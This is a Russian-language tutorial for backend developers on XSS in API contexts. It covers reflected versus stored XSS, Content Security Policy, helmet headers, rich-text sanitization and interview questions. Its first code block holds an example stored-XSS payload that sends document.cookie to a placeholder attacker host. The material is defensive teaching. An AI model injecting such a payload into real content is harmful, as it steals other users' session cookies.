# XSS в контексте API (отражение пользовательского контента), CSP

> **TL;DR:** Backend-разработчик обычно думает "XSS — это проблема фронтенда", но API-сервис — источник данных, которые фронтенд рендерит, и часть защиты структурно принадлежит именно API: что именно сервер отдаёт в ответах (сырой HTML пользователя без указания на необходимость экранирования), какие заголовки выставляет (CSP, `X-Content-Type-Options`), и как хранит/санитизирует пользовательский контент до сохранения. CSP — не замена экранированию на фронтенде, а дополнительный рубеж: даже если инъекция каким-то образом произошла, CSP ограничивает, что вредоносный скрипт вообще может сделать (например, запретить инлайн-скрипты и загрузку с чужих доменов).

## Роль API в XSS, даже если рендерит не он

```json
// API отдаёт пользовательский контент как есть
{ "comment": "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>" }
```

Если фронтенд вставляет это поле в DOM через `innerHTML` (или эквивалент без экранирования — `dangerouslySetInnerHTML` в React, `v-html` в Vue) — скрипт выполнится в контексте страницы жертвы. Формально уязвимость — на стороне фронтенда (небезопасный рендеринг), но API — точка, где можно **снизить вероятность и impact** заранее:
- **Санитизация на входе** (при сохранении) — если поле по бизнес-смыслу должно содержать только простой текст (имя, комментарий без форматирования), не позволять произвольный HTML/JS вообще, а не полагаться на то, что каждый потребитель API безопасно его отрендерит;
- **Явная типизация полей, допускающих HTML** — если поле действительно должно содержать форматированный контент (rich text редактор), санитизировать через allowlist разрешённых тегов/атрибутов (`DOMPurify` на любой стороне, где происходит рендеринг, или на этапе сохранения через `sanitize-html` на Node);
- **Правильный `Content-Type`** — API, отдающий JSON, должен явно указывать `application/json`, не позволяя браузеру самостоятельно "угадать" тип контента и попытаться интерпретировать ответ как HTML (см. `X-Content-Type-Options` ниже).

## Reflected vs Stored — где именно проявляется

```
Reflected XSS: полезная нагрузка приходит в запросе И сразу отражается в ответе
  GET /search?q=<script>...</script> → страница результатов встраивает q в HTML без экранирования

Stored XSS: полезная нагрузка сохраняется в БД через один запрос, выполняется при чтении другим пользователем
  POST /comments {"text": "<script>...</script>"} → сохранено → GET /posts/1 отдаёт этот комментарий → рендерится у ДРУГИХ пользователей
```

Stored XSS обычно опаснее — один успешный вброс атакует **каждого** пользователя, кто впоследствии увидит заражённый контент (комментарий, профиль, отзыв), а не только того, кто перешёл по специально сконструированной ссылке (как в reflected). API особенно причастен к stored-сценарию, потому что именно на этапе сохранения — последняя точка, где можно провалидировать/санитизировать контент, прежде чем он станет постоянной частью данных, отдаваемых множеству клиентов.

## CSP — Content Security Policy

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'; base-uri 'self'
```

CSP — HTTP-заголовок, декларативно ограничивающий, откуда странице разрешено загружать/выполнять ресурсы (скрипты, стили, изображения, шрифты) и разрешены ли инлайн-скрипты вообще. Даже если XSS-инъекция каким-то образом произошла (например, санитизация где-то пропустила edge case), строгий CSP может **предотвратить её эксплуатацию**: `script-src 'self'` без `'unsafe-inline'` заблокирует выполнение инжектированного `<script>...</script>` прямо в HTML (инлайн-скрипты запрещены политикой, браузер их просто не исполнит), а запрет на произвольные внешние домены в `connect-src`/`script-src` не даст вредоносному скрипту, даже если он как-то выполнился, отправить украденные данные (`document.cookie`, токены из памяти) на домен атакующего.

```ts
// NestJS: helmet устанавливает CSP и другие защитные заголовки одной строкой
import helmet from 'helmet';
app.use(helmet({
  contentSecurityPolicy: {
    directives: { defaultSrc: ["'self'"], scriptSrc: ["'self'"], objectSrc: ["'none'"] },
  },
}));
```

CSP — defense in depth, не замена правильному экранированию на фронтенде: сама уязвимость (небезопасная вставка непроверенного контента в DOM) остаётся, CSP лишь ограничивает урон, который эта уязвимость может нанести при эксплуатации. Полагаться только на CSP, оставляя основную защиту (экранирование/санитизация) дырявой, — тот же тип ошибки, что "CORS защищает API" (см. [CORS: что реально делает](./10-cors.md)) — принять дополнительный барьер за основную защиту.

## Другие заголовки, относящиеся к той же категории

```
X-Content-Type-Options: nosniff        -- запрещает браузеру угадывать тип контента вопреки Content-Type
X-Frame-Options: DENY                  -- запрещает встраивание страницы в <iframe> (защита от clickjacking)
```

`helmet()` выставляет разумный набор таких заголовков по умолчанию — минимальный барьер, который стоит подключать в любом Node/Nest-приложении, отдающем HTML или обслуживающем API, потребляемое браузером напрямую.

## Что спрашивают на собеседовании

1. **Backend-разработчик говорит "XSS — не моя проблема, я не рендерю HTML". Согласны?** — нет: API — источник данных, точка сохранения — последний момент для санитизации перед тем, как контент станет постоянно отдаваемым множеству пользователей (особенно критично для stored XSS); правильные заголовки (`Content-Type`, CSP) — тоже ответственность backend'а.
2. **Чем reflected XSS отличается от stored и почему stored обычно опаснее?** — reflected требует, чтобы жертва перешла по специально сконструированной ссылке с полезной нагрузкой в запросе; stored сохраняется один раз и атакует каждого, кто впоследствии увидит заражённый контент, без необходимости отдельной ссылки на каждую жертву.
3. **Что даёт CSP, если инъекция всё равно произошла?** — ограничивает возможности эксплуатации: например, запрет инлайн-скриптов не даст браузеру исполнить инжектированный `<script>`, ограничение `connect-src` не даст украденным данным уйти на произвольный внешний домен.
4. **Достаточно ли CSP вместо экранирования на фронтенде?** — нет, это дополнительный рубеж (defense in depth), не замена — основная уязвимость (небезопасная вставка контента в DOM) остаётся, CSP лишь снижает impact при её эксплуатации.
5. **Как санитизировать пользовательский rich-text контент, который должен допускать HTML (например, форматированный комментарий)?** — allowlist разрешённых тегов/атрибутов через специализированную библиотеку (DOMPurify/sanitize-html), не полная блокировка HTML и не доверие произвольному вводу как есть.
